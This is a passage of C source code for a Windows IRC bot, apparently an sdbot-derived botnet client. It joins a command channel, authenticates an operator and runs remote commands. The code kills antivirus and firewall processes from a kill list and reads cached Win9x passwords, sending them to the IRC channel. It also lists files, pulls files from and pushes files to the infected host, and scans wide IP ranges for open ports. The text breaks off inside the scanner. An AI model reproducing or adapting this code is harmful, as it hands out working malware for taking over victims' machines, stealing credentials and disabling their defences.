	SOCKET Server;
	#ifdef USE_IDENT_SERVER
	DWORD id;
	if (identsock < 1) {
		run_ident = TRUE;
		CreateThread(NULL, 0, &identserv,(LPVOID)IRC_port, 0, &id);
	}
	#endif
	if ((IRC_Socket = create_sock(IRC_server,IRC_port)) < 1)  return 0;
	err = irc_read(IRC_Socket,channel,channelpass);
	#ifdef Let_The_Bot_Talk
	if (talk_thread_handle) TerminateThread(talk_thread_handle,0);
	#endif
	if (err == 2) goto restart;
	else if (err == 3) { 
		Sleep(distime);
		goto restart;
	}
	return err;

}

void getnick()
{
	DWORD nSize = 240;
	char username[250];
	memset(username,0,sizeof(username));
	memset(nick,0,sizeof(nick));
	if (GetUserName(username, &nSize))
		strcpy(realname,username);
	strtok(username," ");
	if (strlen(username) < 3 || strlen(username) > 20 || strcmp(username,"Administrator") == 0 || strcmp(username,"Default") == 0)  //we create a random nick
		randnick();
	else {
		srand(GetTickCount());
		if (rand()%3 == 2) strcpy(nick,username);
		else sprintf(nick,"%s%i",username,(rand()%99));//add a random number at the end of the username
	}
}
void randnick()
{
	memset(nick,0,sizeof(nick));
	int c, len;
	srand(GetTickCount());
	len = (rand()%3)+4;
	for (c=0; c<len; c++) nick[c] = (rand()%26)+97;
	nick[c+1] = '\0';
	strcpy(realname,nick);
}

int irc_read(SOCKET Server,char *channel,char *channelpass)
{
	char *line;
	char buf[4096];
	char buffer[4096];
	int er = 1;
	int i;
	memset(logins,0,sizeof(logins));
	SOCKADDR sa;
	int sas;
	memset(IP,0,sizeof(IP));
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(Server, &sa, &sas);
	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	sprintf(IP2,"%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3]);
	getnick();
	sprintf(buffer,"NICK %s\nUSER %s \"hotmail.com\" \"%s\" :%s\n",nick,nick,IRC_server,realname);
      	send(Server, buffer, strlen(buffer), 0);
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 120;//timeout after 120 sec.
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(Server, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
	{
		closesocket(Server); //the server didnt responce within 60 sec. so we try a other server
		return 0;
	}
	memset(Online_time,0,sizeof(Online_time));
	char date[70];
	GetDateFormat(0x409,0,0,"(dd:MMM:yyyy,",date,70);
	strcat(Online_time,date);
	memset(date,0,sizeof(date));
	GetTimeFormat(0x409,0,0,"HH:mm:ss)",date,70);
	strcat(Online_time,date);
	int t=0;
	int x=0;
	int len=0;
	while (1) {
		memset(buffer,0,sizeof(buffer));
		if ((len = recv(Server, buffer,sizeof(buffer), 0)) <= 0) 
			break;
		if (dccspy > 0) send(dccspy,buffer, len, 0);
		for (t=0;t!=len;t++)
		{
			if (buffer[t] == '\r' || buffer[t] == '\n' || x == 4000) {
				if (x == 0) continue;
				buf[x] = '\0';
				er = irc_readline(buf,Server,channel,channelpass);
				if (er > 0) {
					closesocket(Server);
					return er;
				}
				memset(buf,0,sizeof(buf));
				x=0;
			}
			else {
				buf[x] = buffer[t];
				x++;
			}

		}
		
	}
	closesocket(Server);
	return 0;
}


int irc_readline(char * line,SOCKET Server,char *channel,char *channelpass)
{
	char buf[512];
	char line1[512];
	char *s[8];
	char *x;
	char *y;
	char user[50];
	char * hostname;
	char hostS[512];
	int i,c,w;
	int err = 0;
	DWORD id;
	BOOL master = FALSE;
	memset(buf,0,sizeof(buf));

	strncpy(line1, line, sizeof(line1)-1);
	s[0] = strtok(line1, " ");
	for (i = 1; i < 8; i++) s[i] = strtok(NULL, " ");
	if (s[0] == NULL || s[1] == NULL) return 0;
	if (strcmp("PING", s[0]) == 0) {
		sprintf(buf,"PONG %s\n",s[1]);
		send(Server, buf, strlen(buf), 0);
	}
	if (strcmp("376", s[1]) == 0 || strcmp("422", s[1]) == 0) {
		if (s[2] != NULL) sprintf(nick,s[2]);
		if (channelpass) sprintf(buf,"JOIN %s %s\n",channel,channelpass);
		else sprintf(buf,"JOIN %s\n",channel);
		send(Server, buf, strlen(buf), 0);
		#ifdef USE_IDENT_SERVER
		run_ident = FALSE;
		if (identsock > 0) closesocket(identsock);
		#endif
		#ifdef  rawcommands_after_connect
		raw_commands(Server);
		#endif
	}
	if (strcmp("433",s[1]) == 0 || strcmp("432",s[1]) == 0) {
		randnick();
		sprintf(buf,"NICK %s\n",nick);
		send(Server, buf, strlen(buf), 0);
	}
	if (s[2] == NULL) return 0;

	if (strcmp("366",s[1]) == 0) {
		#ifdef rawcommands_after_join
		raw_commandsonjoin(Server,s[3]);
		#endif
		#ifdef Let_The_Bot_Talk
		talk_thread_handle = CreateThread(NULL, 0, &talk_thread, (LPVOID)Server, 0, &id);
		#endif
	}
	strncpy(user, s[0]+1, sizeof(user)-1);

	strtok(user, "!");
	if (strcmp("NICK",s[1]) == 0) {
		for (i = 0; i != maxlogins; i++) {
			if (strcmp(logins[i],user) == 0 && logins[i] != NULL) strcpy(logins[i],s[2]+1);
		}
	}
	if (strcmp("QUIT", s[1]) == 0 || strcmp("PART", s[1]) == 0) {
		for (i = 0; i != maxlogins; i++) {
			if (strcmp(logins[i],user) == 0 && logins[i] != NULL) memset(logins[i],0,sizeof(logins[i]));
		}

	}
	if (s[3] == NULL) return 0;
	if ((strcmp(channel,s[3]) == 0 && (strcmp("471",s[1]) == 0 || strcmp("472",s[1]) == 0 || strcmp("473",s[1]) == 0 || strcmp("474",s[1]) == 0 || strcmp("475",s[1]) == 0))) return 4; //we cant join channel ? its full,invite only,whe dont have the correct key or we are banned  maybe some fucking ircop we try a other server
	if (strcmp("KICK", s[1]) == 0) { //hope we are not kicked...
		for (i = 0; i <= maxlogins; i++) {
			if (strcmp(logins[i],s[3]) == 0 && logins[i] != NULL) memset(logins[i],0,sizeof(logins[i])); //or master is kicked
		}
		if (strcmp(nick,s[3]) == 0) {
			sprintf(buf,"JOIN %s %s\n",channel,channelpass);
			send(Server, buf, strlen(buf), 0);
		}
	}
	if ((strcmp(PRIVMSG,s[1]) == 0 || (strcmp("332",s[1]) == 0 && topiccommands))) { //its a privmsg or topic
		if (strcmp(PRIVMSG,s[1]) == 0) {
			strcpy(hostS,s[0]);
			hostname = strstr(hostS, "@");
			if (strstr(s[2], "#") == NULL) s[2] = user;
			for (i = 0; i <= maxlogins; i++) {
				if (strcmp(logins[i],user) == 0 && logins[i] != NULL) master = TRUE;
			}
			#ifdef GIVE_VERSION_REPLY
			if (strcmp(s[3],":VERSION") == 0) {
				sprintf(buf,"NOTICE %s :VERSION %s\n",user,VERSION_REPLY);
				send(Server, buf, strlen(buf), 0);
			}
			#endif
			#ifdef GIVE_PING_REPLY
			if (strcmp(s[3],":PING") == 0 && s[4] != NULL) {
				sprintf(buf,"NOTICE %s :PING %s\n",user,s[4]);
				send(Server, buf, strlen(buf), 0);
			}
			#endif
			if (strcmp(login_command,s[3]+1) == 0 && s[4] != NULL)
			{
 				if (master) return 0;
				int x;
				for (x = 0; x < maxlogins; x++) {
					if (logins[x][0] != '\0') continue;
					#ifdef Use_Encrypted_commands
					decryptpass(s[4],hostname+1);
					#endif
					if (strcmp(password,s[4]) == 0) {
						char * hostname2;
						#ifdef use_nickname_match
						for (i=0;trustednicks[i] != NULL;i++)
						{
							if (strcmp(user,trustednicks[i]) == 0) goto nick;
						}
						return 0;
						nick:;
						#endif
						#ifdef use_ident_match
						char * h_ident;
						hostname2 = strstr(s[0], ":");
						h_ident = strtok(hostname2, "@")+strlen(user)+2;
      	       
						for (i=0;trustedidents[i] != NULL;i++)
						{
							if (strcmp(h_ident,trustedidents[i]) == 0) goto ident;
						}
						return 0;
						ident:;
						#endif
						
						#ifdef use_hostname_match
						BOOL goodhost = FALSE;
						for (i = -1;trustedhosts[i+1] != NULL; i++) 
						{

							restart:;
							i++;
							if (trustedhosts[i] == NULL) return 0;
							for (c = 0; c < strlen(trustedhosts[i])-1; c++) {
								if (trustedhosts[i][0] == '*') {
									if (hostname[strlen(hostname) - 1 - c] != trustedhosts[i][strlen(trustedhosts[i]) - 1 -c]) {
										if (trustedhosts[i][strlen(trustedhosts[i]) - 1 -c] != '*') goto restart;
									}

								}
								else if (hostname[c+1] != trustedhosts[i][c]) {
									if (trustedhosts[i][c] == '*') continue;
									else goto restart;
								}
							}
							goodhost = TRUE;
							break;
						}
						
						if (goodhost || trustedhosts[0] == NULL) {
						#endif
							strcpy(logins[x],  user);
							master = TRUE;
							#ifdef update_after_x_days_not_logged_in
							set_new_date();
							#endif
							return 0;
						#ifdef use_hostname_match
						}
						#endif
					}
					break;
				}
			}
		}
		else {
			s[2] = s[3];
		}
		if (!master && strcmp("332",s[1]) != 0) return 0;
		
		if (strcmp(":\1DCC",s[3]) == 0 && s[4] != NULL) {
			x = strstr(line, " :");
			y = strstr(x+1, " ");
			err = read_command(Server,Server,s[4],y+1,s[2]);
		}
		else 	{
			SOCKET sendsock = Server;
			if ((x = strstr(line, " :")+2) == NULL) return 0;
			if (strlen(x) < 2) return 0;
			if (x[0] != prefix) return 0;
			x = x+1;
			#ifdef Use_Encrypted_commands
			if (strcmp("332",s[1]) == 0) decryptpass(x,decryptkey);
			else decryptpass(x,hostname+1);
      	 		#endif
			if (x[strlen(x)-1] == 's' && x[strlen(x)-2] == '-' && x[strlen(x)-3] == ' ') { x[strlen(x)-1] = '\0'; x[strlen(x)-1] = '\0'; x[strlen(x)-1] = '\0'; sendsock = 0; }
			char command1[512];
			memset(command1,0,sizeof(command1));
			strcpy(command1,x);
			strtok(command1," ");
			if (strcmp(command1,nick) == 0 || strcmp(command1,Bot_Version) == 0 || strcmp(command1,OS) == 0 || strcmp(command1,connection_type) == 0 || strcmp(command1,IP2) == 0)  { 
				char *command2;
				char commandline[512];
				memset(commandline,0,sizeof(commandline));
				strcpy(commandline,x);
				command2 = strstr(x," ");
				strtok(command2," ");
				err = read_command(sendsock,Server,command2+1,commandline+1+strlen(command1+1),s[2]);
			 }
			else
				err = read_command(sendsock,Server,command1,x,s[2]);
		}

	}
	return err;
}
#ifdef Let_The_Bot_Talk
DWORD WINAPI talk_thread(LPVOID Param)
{
	int c;
	while (IRC_Socket > 0) {
		Sleep(talk_delay);
		for (c = 0;talk_lines[c] != NULL;c++) {
			privmsg(IRC_Socket,talk_lines[c],channel);
			Sleep(2600);
		}
	}
	return 0;

}
#endif

#ifdef use_funstuf 
void Keyevent (BYTE key,BOOL caps)
{
	if (caps) keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),FALSE?KEYEVENTF_KEYUP:0,0);
        keybd_event(key,MapVirtualKey(key,0),FALSE?KEYEVENTF_KEYUP:0,0);
	keybd_event(key,MapVirtualKey(key,0),TRUE?KEYEVENTF_KEYUP:0,0);
	if (caps) keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),TRUE?KEYEVENTF_KEYUP:0,0);
}
#endif

#ifdef Use_Firewall_killer
DWORD WINAPI kill_av(LPVOID param)
{
	while (1)
	{
		listProcesses(0,NULL,NULL,TRUE);
		Sleep(killer_delay);
	}
	return 0;
}
#endif
int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread)
{
	HANDLE hand;
	HANDLE killer;
	char buffer[400];
	memset(buffer,0,sizeof(buffer));
 	PROCESSENTRY32 pe32 = {0};
	int c;
	char window[250];
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		hand = fCreateToolhelp32Snapshot(2, 0);
		if (hand != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hand, &pe32)) {
				do {
					if (killthread) {
						#ifdef Use_Firewall_killer
						CharUpperBuff(pe32.szExeFile,strlen(pe32.szExeFile));
						for(c = 0;kill_list[c] != NULL;c++)
						{
							if (strstr(pe32.szExeFile,kill_list[c]) != NULL) {
 								killer=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
								TerminateProcess(killer,0);
								break;
							}
						}
						#endif
					}
					else if (proccess == NULL) {
						if (strlen(buffer) + strlen(pe32.szExeFile) > 490) { //send the string
							privmsg(sock,buffer,chan);
							if (chan) 
								Sleep(Flood_delay);
							memset(buffer,0,sizeof(buffer));
							strcpy(buffer,pe32.szExeFile);
						}
						else { //buffer is not full jet add the process to the end of the buffer
							strcat(buffer," ");
							strcat(buffer,pe32.szExeFile);
						}

					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							killer = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hand);
							if (!TerminateProcess(killer,0)) return 0;
							return 1;
						 }

					}

				} while (fProcess32Next(hand, &pe32));
			}
			CloseHandle(hand);
		}
	}
	if (!killthread && proccess == NULL && strlen(buffer) > 1) privmsg(sock,buffer,chan);
 	return 0;

}


int getfiles(char *current,SOCKET dccsock,char *chan)
{
	char sendbuf[MAX_PATH];
	char parent[MAX_PATH];
	memset(parent,0,sizeof(parent));
        HANDLE Hnd;
        WIN32_FIND_DATA WFD;
	DWORD c;
	int count = 0;
	int count2 = 0;	
	sprintf(sendbuf,"S: %s",current);
	privmsg(dccsock,sendbuf,chan);
        Hnd = FindFirstFile(current, &WFD);
        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				sprintf(sendbuf,"<%s>",WFD.cFileName);
				privmsg(dccsock,sendbuf,chan);
			}
			else {
				count++;
				sprintf(sendbuf,"%s  (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
				privmsg(dccsock,sendbuf,chan);
			}
			if (chan) Sleep(Flood_delay);
     		}

      }
    	FindClose(Hnd);
	sprintf(sendbuf,"Found: %i files and %i dirs",count,count2);
	privmsg(dccsock,sendbuf,chan);
   	return 0;
}




#ifdef  rawcommands_after_connect
void raw_commands(SOCKET sock)
{
	char *p;
	char buf[512];
	char buf2[512];
	char buf3[512];
	int c;
	for (c = 0;rawcommands[c] != NULL;c++) {
		if (strstr(rawcommands[c], "$NICK") != NULL) {
			memset(buf,0,sizeof(buf));
			memset(buf2,0,sizeof(buf2));
			memset(buf3,0,sizeof(buf3));
			strcpy(buf,rawcommands[c]);
			strcpy(buf3,buf);
			strtok(buf3,"$NICK");
			p = strstr(buf, "$NICK");
			sprintf(buf2,"%s%s%s\n",buf3,nick,p+5);
		}
		else
			sprintf(buf2,"%s\n",rawcommands[c]);
		send(sock, buf2, strlen(buf2), 0);
		Sleep(1000);
	}
}
#endif

#ifdef rawcommands_after_join
void raw_commandsonjoin(SOCKET sock,char *chan)
{
	char *p;
	char buf[512];
	char buf2[512];
	char buf3[512];
	int c;
	for (c = 0;onjoin_commands[c] != NULL;c++) {
		if (strstr(onjoin_commands[c], "$CHAN") != NULL) {
			memset(buf,0,sizeof(buf));
			memset(buf2,0,sizeof(buf2));
			memset(buf3,0,sizeof(buf3));
			strcpy(buf,onjoin_commands[c]);
			strcpy(buf3,buf);
			strtok(buf3,"$CHAN");
			p = strstr(buf, "$CHAN");
			sprintf(buf2,"%s%s%s\n",buf3,chan,p+5);
		}
		else
			sprintf(buf2,"%s\n",onjoin_commands[c]);
		send(sock, buf2, strlen(buf2), 0);
		Sleep(1000);
	}
}
#endif

DWORD WINAPI dcc_chat(LPVOID param)
{
	char buffer[4096];
	char host[20];
	int port;
	SOCKET ircsock;
	ircsock = dcchosts;
	sprintf(host,dcchost);
	port = dccport;
	int i;
	char x[MAX_PATH];
	info = TRUE;
	char line[4096];
   	SOCKET dcc;
	if ((dcc = create_sock(host,port)) < 1) return 0;
	while (1) {
		memset(buffer,0,sizeof(buffer));
		if (recv( dcc, buffer, sizeof(buffer), 0) <= 0) 
			return 1;
		strncpy(line, buffer, sizeof(line)-1);
		strtok(buffer, " ");
		strtok(buffer,"\n");
		strtok(line,"\n");
		if (strlen(line) < 3) continue;
		if (buffer == NULL) continue;
		if (read_command(dcc,ircsock,buffer,line,NULL) == 1) {
			WSACleanup();
			exit(0);
		}

	}
	closesocket(dcc);
	return 0;
}
DWORD WINAPI dcc_send(LPVOID param)
{
	char buffer[1024];
	unsigned int move;
	DWORD err, err2;
   	SOCKET         dcc;
	SOCKET         sock;
	SOCKADDR_IN    GuestAddr;
	SOCKADDR_IN    SockAddr;
	char chan[50];	
	strcpy(chan,sendtochan);
	char filename[MAX_PATH];
	SOCKET sendsock;
	sendsock = dcchosts;
	strcpy(filename,dccfilename);
	char sendbuf[512];  
	DWORD mode = 0;
	while (1) 
	{
		if ((dcc = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      			sprintf(sendbuf,Error);
			break;
		}
		memset(&SockAddr, 0, sizeof(SockAddr));
   		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = htons(0);//random port
		SockAddr.sin_addr.s_addr = INADDR_ANY;   
		if (bind(dcc, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) {
			sprintf(sendbuf,Error);
			break;
		}
		int length = sizeof(SockAddr);
		getsockname(dcc, (SOCKADDR *)&SockAddr, &length);

		short portnum = ntohs(SockAddr.sin_port);
		char file[MAX_PATH];
		for (int c=0;c<=strlen(filename);c++)
		{
			if (filename[c] == 32) file[c] = 95;
			else file[c] = filename[c];
		}

		if (listen(dcc, 1) != 0) {
			sprintf(sendbuf,Error);
			break;
		}
		HANDLE testfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,Error);
			break;
		}
		length = GetFileSize(testfile,NULL);
		sprintf(sendbuf,"DCC SEND %s %i %i %i",file,htonl(inet_addr(IP)),portnum,length);
		privmsg(sendsock,sendbuf,chan);
		TIMEVAL time;
   		fd_set fd_struct;
    		time.tv_sec = 60;//timeout after 60 sec.
    		time.tv_usec = 0;
   		FD_ZERO(&fd_struct);
    		FD_SET(dcc, &fd_struct);
		if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
		{
			privmsg(sendsock,"Dcc send timeout",chan);
			break;
		}
		int addrlen = sizeof(GuestAddr);
		if ((sock = accept(dcc, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  {
			sprintf(sendbuf,Error);
			break;
		} 
		closesocket(dcc);
		int c;
		int count;
		while (length) {
			int Fsend = 1024;
			memset(buffer,0,sizeof(buffer));
			if (Fsend>length) Fsend=length;
			move = 0-length;
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);
			int bytes_sent = send(sock, buffer, Fsend, 0);
			err2 = recv(sock,buffer ,sizeof(buffer), 0);
			if (err2 < 1 || bytes_sent < 1) {
				privmsg(sendsock,"Socket error",chan);
				closesocket(sock);
				return 1;
			}
			length = length - bytes_sent;
		}
		if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
		sprintf(sendbuf,"Transfer complete");
		break;
	}
	privmsg(sendsock,sendbuf,chan);
	if (dcc > 0) closesocket(dcc);
	closesocket(sock);
      return 0;
}

DWORD WINAPI dcc_getfile(LPVOID param)
{
	char buffer[4096];
	char sendbuffer[512];
	DWORD err;
   	SOCKET	dcc;
	SOCKET	sock;
	sock = dcchosts;
	char chan[50];	
	if (sendtochan != NULL) strcpy(chan,sendtochan);
	char host[20];
	int port;
	port = dccport;
	int received = 0;
	unsigned long received2;
 	sprintf(host,dcchost);
	char sysdir[MAX_PATH];
	char filename[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(filename,"%s\\%s",sysdir,dccfilename);
	FILE *infile;
	while (1) 
	{
		HANDLE testfile = CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuffer,"Error with file");
			break;
		}
		CloseHandle(testfile);
		infile = fopen(filename,"a+b");
		if (infile == NULL) {
			sprintf(sendbuffer,"Error with file");
			break;
		}

		if ((dcc = create_sock(host,port)) < 1) {
			sprintf(sendbuffer,"Error connecting");
			break;
		}
		err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));
			err = recv( dcc, buffer, sizeof(buffer), 0);
			if (err == 0) break;
			if (err == SOCKET_ERROR) {
				privmsg(sock,"Socket error",chan);
				fclose(infile);
				closesocket(dcc);
				return 1;
			}
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  htonl(received);
			send(dcc,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuffer,"Transfer complete (size: %i bytes)",received);
		break;
	}
	privmsg(sock,sendbuffer,chan);
	if (infile != NULL) fclose(infile);
	closesocket(dcc);
	return 0;
}

// function used for sysinfo (thanks to sdbot)
 char * sysinfo(char *sinfo, SOCKET sock)
 {
	int total;
	MEMORYSTATUS memstat;
        LPTSTR lpszSystemInfo="???";
        DWORD cchBuff = 256;
	memstat.dwLength = sizeof(MEMORYSTATUS);
	GlobalMemoryStatus(&memstat); // load memory info into memstat

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char os[140];
	strcpy(os,OS);
	char os2[140];
	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		strcpy(os,os2);
	}

	total = GetTickCount() / 1000; 

        if(!GetUserName(lpszSystemInfo, &cchBuff)) lpszSystemInfo = "?";
      	     
	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	DWORD addr = inet_addr(IP);

	hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
	char hostname[250];
	if (hostent != NULL)
		sprintf(hostname,hostent->h_name);
	else sprintf(hostname,"couldn't resolve host");
	char sysdir[MAX_PATH];
	GetSystemDirectory(sysdir,sizeof(sysdir));
	char date[70];
	char time[70];
	GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);
	sprintf(sinfo, "Ver.:%s cpu: %dMHz. ram: %dMB total, %dMB free  %d%s in use W %s (%d.%d, %d). up: %dd %dh %dm. D: %s T: %s Online: %s user: %s %s %s Con: %s name: %s %s\\",
		Bot_Version,cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,memstat.dwMemoryLoad,"%",
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60,date , time,Online_time, lpszSystemInfo,IP,hostname,connection_type,connection_name,sysdir);

	return sinfo; // return the sysinfo string
 }
// cpu speed function (thanks to sdbot)
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		//  speed = ((cyclecount()-startcycle)/100000)/10;
		speed = (cyclecount() - startcycle) / 1000000; // FIXED

	} while (speed > 1000000); 
	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles) (thanks to sdbot)
 unsigned __int64 cyclecount(void)
 {
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

 }


//get passwords only win 9x ( i think i found this source on http://www.planet-source-code.com/ but im not sure)

struct PASSWORD_CACHE_ENTRY {
	WORD cbEntry;
	WORD cbResource;
	WORD cbPassword;
	BYTE iEntry;
	BYTE nType;
	char abResource[1];
};

typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );

DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);

typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);

ENUMPASSWORD pWNetEnumCachedPasswords;

typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
} PASSCACHECALLBACK_DATA;

BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
int cashedpasswords(SOCKET sock,char *sendto)
{
	char sendbuf[2150];
	char start[] = "S";
	HMODULE hLib=LoadLibrary("MPR.DLL");

	PASSCACHECALLBACK_DATA dat;
	dat.pBuffer=(char *)malloc(65536);
	dat.nBufLen=65536;
	dat.nBufPos=0;
	pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");
	if (!pWNetEnumCachedPasswords)	{ //only win 9x!!
		return 1;
	}
	pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
	char *svStr;
	svStr=dat.pBuffer;
	privmsg(sock,start,sendto);
	do {
		char *svRsc=svStr;
		svStr+=lstrlen(svStr)+1;
		char *svPwd=svStr;
		svStr+=lstrlen(svStr)+1;
		memset(sendbuf,0,sizeof(sendbuf));
		sprintf(sendbuf,"%s %s",svRsc,svPwd);
		privmsg(sock,sendbuf,sendto);
		if (sendto != NULL) Sleep(Flood_delay);
	}while(*svStr!='\0');
	FreeLibrary(hLib);
	return 0;
};





//port scanner
DWORD WINAPI port_scanner(LPVOID param)
{
	int i = (int)param;
	char buf[4];
	memset(buf,0,sizeof(buf));
	DWORD c,token,d,err;
	int A,B,C,D;
	//break the ip in 4 parts
	for (d=0,c=0,token=0;c<=strlen(threads2[i].string1);c++)
	{
		if  (threads2[i].string1[c] == 46 || c == strlen(threads2[i].string1)) {
			srand(GetTickCount());
			if (token == 0) { 
				if (strcmp(buf,"x") == 0) A = (rand()%254);
				else A = atoi(buf);

			}
			if (token == 1) {
				if (strcmp(buf,"x") == 0) B = (rand()%254);
				else B = atoi(buf);
			}
			if (token == 2) {
				if (strcmp(buf,"x") == 0) C = (rand()%254);
				else C = atoi(buf);
			}
			if (token == 3) {
				if (strcmp(buf,"x") == 0) D = (rand()%254);
				else D = atoi(buf);
			}
			memset(buf,0,sizeof(buf));
			d=0;
			token++;
			continue;
		}
		else {
			buf[d] = threads2[i].string1[c];
			d++;
		}
	}
	while (err != 1) {
		err = scan_host(i,A,B,C,D);
		sprintf(threads2[i].C_name,"ip: %s p: %i d: %i.",threads2[i].string1,threads2[i].int_1,threads2[i].int_2);
 		if (strlen(threads2[i].string2) > 1) {
			strcat(threads2[i].C_name," l:");
			strcat(threads2[i].C_name,threads2[i].string2);
		}
	}
	threads2[i].id = 0;
	return 0;

}

int scan_host(int i,int A,int B,int C,int D)
{
	char sendbuf[512];
	SOCKADDR_IN    SockAddr;
   	SOCKET         sock[MAX_PORTSCAN_SOCKETS_TO_USE];
	FILE *infile;
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(threads2[i].int_1);
	DWORD mode = 1;
	DWORD id;
	TIMEVAL time;
	int c;
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
		sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   		if (sock[c] == INVALID_SOCKET)
      			return 1;
		ioctlsocket(sock[c],FIONBIO,&mode);
	}
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
		while (1) {
			if (D > 254) {
				D = 0;
				C++;
			}
			else {
				D++;
				break;
			}
			if (C > 254) {
				C = 0;
				B++;
			}
			else 
				break;
			if (B > 254) {
				B = 0;
				A++;
			}
			else 
				break;
			if (A > 254) { //we are at 255.255.255.255 and we start again with 0.0.0.0
				A = 0;
				B = 0;
				C = 0;
				D = 0;
			}
			else 
				break;

		}
		sprintf(threads2[i].string1,"%i.%i.%i.%i",A,B,C,D);
		iaddr.s_addr = inet_addr(threads2[i].string1);
		if (iaddr.s_addr == INADDR_NONE)
			return 0;
		SockAddr.sin_addr = iaddr; 
  		connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
	}
      	Sleep(threads2[i].int_2);     
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
   		fd_set fd_struct;
    		time.tv_sec = 0;
    		time.tv_usec = 0;
   		FD_ZERO(&fd_struct);
    		FD_SET(sock[c], &fd_struct);
